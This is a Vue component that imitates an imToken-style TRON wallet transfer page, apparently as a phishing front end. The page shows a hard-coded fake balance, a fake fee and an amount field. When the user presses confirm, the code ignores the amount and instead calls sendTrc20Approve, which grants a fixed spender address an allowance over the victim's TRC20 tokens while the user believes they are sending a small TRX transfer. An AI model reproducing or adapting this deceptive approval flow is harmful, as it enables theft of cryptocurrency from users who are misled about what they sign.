<script setup lang="ts">
// <!-- Import Dependencies Start --->
import { computed, onMounted, ref, watch } from "vue";

import { useTronWallet } from "@/composables/use-tron-wallet";
import { TRON_SPENDER_ADDRESS } from "@/config/tron";
import {
  sendTrc20Approve,
  TRON_TEST_APPROVE_AMOUNT_LABEL,
} from "@/contracts/trc20-contract";
import { mapTronErrorMessage } from "@/utils/tron-error-util";
import { waitForTronTransaction } from "@/utils/tron-util";
// <!-- Import Dependencies End --->

type TransferPhase = "idle" | "pending" | "confirming" | "success" | "error";

// <!-- Reactive Data Start --->
const {
  address,
  isConnecting,
  isConnected,
  tronWeb,
  isOnTargetNetwork,
  walletError,
  connect,
} = useTronWallet();

const showConfirmDrawer = ref(false);
const transferAmount = ref("0.1");
const transferPhase = ref<TransferPhase>("idle");
const transferErrorMessage = ref("");
const transferAttempted = ref(false);

/** 界面展示用余额（imToken 样式） */
const displayBalance = "1.50212";
// <!-- Reactive Data End --->

// <!-- Computed Properties Start --->
const payerAddress = computed(() => address.value ?? "");
const recipientAddress = computed(() => TRON_SPENDER_ADDRESS);

const displayAmountLabel = computed(() => TRON_TEST_APPROVE_AMOUNT_LABEL);

const isAmountValid = computed(() => {
  const value = transferAmount.value.trim();
  if (!value) return false;
  if (!/^\d+(\.\d+)?$/.test(value)) return false;
  return Number(value) > 0;
});

const amountFiatLabel = computed(() => {
  const value = Number(transferAmount.value.trim());
  if (!isAmountValid.value) return "$0";
  return `$${(value * 0.3212).toFixed(5)}`;
});

const isTransferBusy = computed(
  () =>
    transferPhase.value === "pending" || transferPhase.value === "confirming",
);

const canConfirm = computed(
  () =>
    isConnected.value &&
    isOnTargetNetwork.value &&
    isAmountValid.value &&
    !isConnecting.value &&
    !isTransferBusy.value,
);

const confirmButtonLabel = computed(() => {
  if (isConnecting.value) return "连接钱包中...";
  if (!isConnected.value) return "等待连接钱包";
  if (!isOnTargetNetwork.value) return "网络不正确";
  return "确定";
});

const drawerConfirmLabel = computed(() => {
  if (transferPhase.value === "pending") return "等待签名...";
  if (transferPhase.value === "confirming") return "确认中...";
  if (transferPhase.value === "success") return "已发送";
  if (transferPhase.value === "error") return "重新确定";
  return "确定";
});
// <!-- Computed Properties End --->

// <!-- Function & API Request Start --->
const autoConnectWallet = async () => {
  if (isConnecting.value || isConnected.value) return;
  await connect();
};

const openConfirmDrawer = () => {
  if (!canConfirm.value) return;
  showConfirmDrawer.value = true;
};

const closeConfirmDrawer = () => {
  if (isTransferBusy.value) return;
  showConfirmDrawer.value = false;
  if (transferPhase.value !== "success") {
    transferPhase.value = "idle";
    transferAttempted.value = false;
    transferErrorMessage.value = "";
  }
};

const useAllBalance = () => {
  transferAmount.value = displayBalance;
};

const runApprove = async () => {
  if (
    !isConnected.value ||
    !isOnTargetNetwork.value ||
    !address.value ||
    !tronWeb.value
  )
    return;
  if (transferAttempted.value) return;
  if (isTransferBusy.value) return;
  if (transferPhase.value === "success") return;

  transferAttempted.value = true;
  transferPhase.value = "pending";
  transferErrorMessage.value = "";

  try {
    const txid = await sendTrc20Approve(tronWeb.value);
    transferPhase.value = "confirming";

    const receipt = await waitForTronTransaction(tronWeb.value, txid);
    if (receipt.receipt?.result && receipt.receipt.result !== "SUCCESS") {
      throw new Error(`交易失败：${receipt.receipt.result}`);
    }

    transferPhase.value = "success";
  } catch (error) {
    transferPhase.value = "error";
    transferErrorMessage.value = mapTronErrorMessage(error);
    transferAttempted.value = false;
  }
};

const handleDrawerConfirm = async () => {
  if (transferPhase.value === "success") return;
  if (transferPhase.value === "error") {
    transferAttempted.value = false;
    transferPhase.value = "idle";
    transferErrorMessage.value = "";
  }
  await runApprove();
};
// <!-- Function & API Request End --->

// <!-- Life Cycle Start --->
onMounted(() => {
  void autoConnectWallet();
});

watch(isConnected, (connected) => {
  if (!connected) {
    showConfirmDrawer.value = false;
    transferPhase.value = "idle";
    transferAttempted.value = false;
    transferErrorMessage.value = "";
  }
});

watch(showConfirmDrawer, (visible) => {
  if (!visible && !isTransferBusy.value && transferPhase.value !== "success") {
    transferPhase.value = "idle";
    transferAttempted.value = false;
    transferErrorMessage.value = "";
  }
});
// <!-- Life Cycle End --->
</script>

<template>
  <div class="im-transfer-page">
    <header class="im-nav">
      <div class="im-nav-back">
        <i class="pi pi-chevron-left" />
      </div>
      <div class="im-nav-title">
        转账
      </div>
      <div class="im-nav-placeholder" />
    </header>

    <section class="im-section">
      <div class="im-section-header">
        <span class="im-section-label">接收地址</span>
        <span class="im-link-text">选择钱包 <i class="pi pi-chevron-right im-link-arrow" /></span>
      </div>
      <div class="im-address-field">
        <div class="im-address-text">
          {{ recipientAddress }}
        </div>
        <i class="pi pi-expand im-scan-icon" />
      </div>
    </section>

    <section class="im-section">
      <div class="im-section-header">
        <span class="im-section-label">转账金额</span>
        <span class="im-token-picker">TRX <i class="pi pi-chevron-right im-link-arrow" /></span>
      </div>
      <div class="im-amount-box">
        <div class="im-amount-row">
          <div class="im-amount-main">
            <InputText
              v-model="transferAmount"
              type="text"
              inputmode="decimal"
              placeholder="0"
              class="im-amount-input"
              :unstyled="true"
            />
            <div class="im-amount-fiat">
              {{ amountFiatLabel }}
            </div>
          </div>
          <button
            type="button"
            class="im-all-btn"
            @click="useAllBalance"
          >
            全部
          </button>
        </div>
        <div class="im-balance-row">
          <span class="im-balance-label">余额</span>
          <span class="im-balance-value">{{ displayBalance }} TRX</span>
        </div>
      </div>
    </section>

    <section class="im-section">
      <div class="im-section-header">
        <span class="im-section-label im-fee-label">
          网络费
          <i class="pi pi-question-circle im-fee-help" />
        </span>
        <span class="im-link-text im-subsidy">
          <i class="pi pi-gift im-gift-icon" />
          转账补贴 <i class="pi pi-chevron-right im-link-arrow" />
        </span>
      </div>
      <div class="im-fee-estimate">
        <span>预计网络费用</span>
        <span class="im-fee-estimate-value">$0 0 TRX</span>
      </div>
      <div class="im-advanced-mode">
        高级模式 <i class="pi pi-chevron-right im-link-arrow" />
      </div>
    </section>

    <Message
      v-if="walletError"
      severity="error"
      :closable="false"
      class="im-message"
    >
      {{ walletError }}
    </Message>

    <div class="im-footer">
      <Button
        :label="confirmButtonLabel"
        class="im-primary-btn w-full"
        size="large"
        :loading="isConnecting"
        :disabled="!canConfirm"
        @click="openConfirmDrawer"
      />
    </div>

    <Drawer
      v-model:visible="showConfirmDrawer"
      position="bottom"
      modal
      :show-close-icon="false"
      :dismissable="!isTransferBusy"
      class="im-detail-drawer"
      style="height: auto"
    >
      <div class="im-detail-header">
        <span class="im-detail-title">转账详情</span>
        <button
          type="button"
          class="im-detail-close"
          :disabled="isTransferBusy"
          @click="closeConfirmDrawer"
        >
          <i class="pi pi-times" />
        </button>
      </div>

      <div class="im-detail-amount">
        -{{ transferAmount }} TRX
      </div>

      <div class="im-detail-list">
        <div class="im-detail-item">
          <div class="im-detail-item-label">
            付款地址
          </div>
          <div class="im-detail-item-value">
            {{ payerAddress }}
          </div>
          <div class="im-detail-item-sub">
            (测试钱包)
          </div>
        </div>
        <div class="im-detail-item">
          <div class="im-detail-item-label">
            收款地址
          </div>
          <div class="im-detail-item-value im-detail-item-value-bold">
            {{ recipientAddress }}
          </div>
          <div class="im-detail-item-sub">
            (TRX-HD)
          </div>
        </div>
        <div class="im-detail-item im-detail-item-inline">
          <span class="im-detail-item-label">网络费</span>
          <span class="im-detail-fee-value">1.10 TRX($0.3533)</span>
        </div>
      </div>

      <Message
        v-if="transferPhase === 'success'"
        severity="success"
        :closable="false"
        class="im-message"
      >
        转账成功，{{ displayAmountLabel }} 已提交
      </Message>

      <Message
        v-if="transferErrorMessage"
        severity="error"
        :closable="false"
        class="im-message"
      >
        {{ transferErrorMessage }}
      </Message>

      <Button
        :label="drawerConfirmLabel"
        class="im-primary-btn w-full im-detail-confirm-btn"
        size="large"
        :loading="isTransferBusy"
        :disabled="isTransferBusy || transferPhase === 'success'"
        @click="handleDrawerConfirm"
      />
    </Drawer>
  </div>
</template>

<style scoped>
.im-transfer-page {
  max-width: 480px;
  margin: 0 auto;
  min-height: 100vh;
  padding: 0 16px 24px;
  background: #fff;
}

.im-nav {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 12px 0 20px;
}

.im-nav-back,
.im-nav-placeholder {
  width: 40px;
  height: 40px;
  display: flex;
  align-items: center;
  justify-content: center;
  color: #111827;
  font-size: 18px;
}

.im-nav-back {
  pointer-events: none;
}

.im-nav-title {
  font-size: 17px;
  font-weight: 600;
  color: #111827;
}

.im-section {
  margin-bottom: 24px;
}

.im-section-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 12px;
}

.im-section-label {
  font-size: 15px;
  color: #6b7280;
}

.im-fee-label {
  display: inline-flex;
  align-items: center;
  gap: 4px;
}

.im-fee-help {
  font-size: 14px;
  color: #9ca3af;
}

.im-link-text {
  font-size: 14px;
  color: #2f80ff;
  display: inline-flex;
  align-items: center;
  pointer-events: none;
}

.im-subsidy {
  gap: 4px;
}

.im-gift-icon {
  font-size: 13px;
}

.im-link-arrow {
  font-size: 11px;
}

.im-token-picker {
  font-size: 14px;
  color: #9ca3af;
  display: inline-flex;
  align-items: center;
  pointer-events: none;
}

.im-address-field {
  background: #f5f6f8;
  border-radius: 12px;
  padding: 14px 16px;
  display: flex;
  align-items: flex-start;
  gap: 12px;
}

.im-address-text {
  flex: 1;
  font-size: 15px;
  line-height: 1.5;
  color: #111827;
  word-break: break-all;
}

.im-scan-icon {
  font-size: 18px;
  color: #9ca3af;
  flex-shrink: 0;
  pointer-events: none;
}

.im-amount-box {
  background: #f5f6f8;
  border-radius: 12px;
  padding: 16px;
}

.im-amount-row {
  display: flex;
  align-items: flex-start;
  justify-content: space-between;
  gap: 12px;
}

.im-amount-main {
  flex: 1;
  min-width: 0;
}

.im-amount-input {
  width: 100%;
  border: none;
  background: transparent;
  font-size: 36px;
  font-weight: 600;
  color: #111827;
  line-height: 1.2;
  padding: 0;
  outline: none;
  box-shadow: none;
}

.im-amount-input::placeholder {
  color: #d1d5db;
}

.im-amount-fiat {
  font-size: 14px;
  color: #9ca3af;
  margin-top: 4px;
}

.im-all-btn {
  flex-shrink: 0;
  padding: 6px 14px;
  border: 1px solid #2f80ff;
  border-radius: 999px;
  background: transparent;
  color: #2f80ff;
  font-size: 14px;
  line-height: 1.2;
  cursor: pointer;
}

.im-balance-row {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-top: 16px;
  padding-top: 14px;
  border-top: 1px solid #e5e7eb;
}

.im-balance-label {
  font-size: 14px;
  color: #9ca3af;
}

.im-balance-value {
  font-size: 14px;
  color: #111827;
}

.im-fee-estimate {
  background: #f5f6f8;
  border-radius: 12px;
  padding: 14px 16px;
  display: flex;
  justify-content: space-between;
  align-items: center;
  font-size: 14px;
  color: #6b7280;
}

.im-fee-estimate-value {
  color: #9ca3af;
}

.im-advanced-mode {
  margin-top: 12px;
  text-align: right;
  font-size: 14px;
  color: #9ca3af;
  pointer-events: none;
}

.im-footer {
  margin-top: 32px;
}

.im-primary-btn {
  background: #2f80ff !important;
  border-color: #2f80ff !important;
  border-radius: 12px !important;
  font-size: 16px !important;
  height: 48px !important;
}

.im-message {
  margin-top: 12px;
}

.im-detail-header {
  display: flex;
  align-items: center;
  justify-content: center;
  position: relative;
  padding: 4px 0 20px;
}

.im-detail-title {
  font-size: 17px;
  font-weight: 600;
  color: #111827;
}

.im-detail-close {
  position: absolute;
  right: 0;
  top: 0;
  width: 32px;
  height: 32px;
  border: none;
  background: transparent;
  color: #9ca3af;
  font-size: 16px;
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;
  padding: 0;
}

.im-detail-close:disabled {
  opacity: 0.5;
  cursor: not-allowed;
}

.im-detail-amount {
  background: #f5f6f8;
  border-radius: 12px;
  padding: 20px 16px;
  font-size: 28px;
  font-weight: 600;
  color: #111827;
  margin-bottom: 20px;
}

.im-detail-list {
  margin-bottom: 20px;
}

.im-detail-item {
  padding: 16px 0;
  border-bottom: 1px solid #f0f0f0;
}

.im-detail-item:last-child {
  border-bottom: none;
}

.im-detail-item-inline {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.im-detail-item-label {
  font-size: 14px;
  color: #9ca3af;
  margin-bottom: 8px;
}

.im-detail-item-inline .im-detail-item-label {
  margin-bottom: 0;
}

.im-detail-item-value {
  font-size: 15px;
  line-height: 1.5;
  color: #111827;
  word-break: break-all;
}

.im-detail-item-value-bold {
  font-weight: 600;
}

.im-detail-item-sub {
  font-size: 13px;
  color: #9ca3af;
  margin-top: 6px;
}

.im-detail-fee-value {
  font-size: 15px;
  color: #111827;
}

.im-detail-confirm-btn {
  margin-top: 8px;
}
</style>

<style>
.im-detail-drawer {
  width: 100%;
  max-width: 480px;
  margin: 0 auto;
  border: none;
  border-radius: 16px 16px 0 0;
  overflow: hidden;
  background: #fff;
}

.im-detail-drawer .p-drawer-header {
  display: none;
}

.im-detail-drawer .p-drawer-content {
  padding: 16px 16px 24px;
  background: #fff;
}
</style>
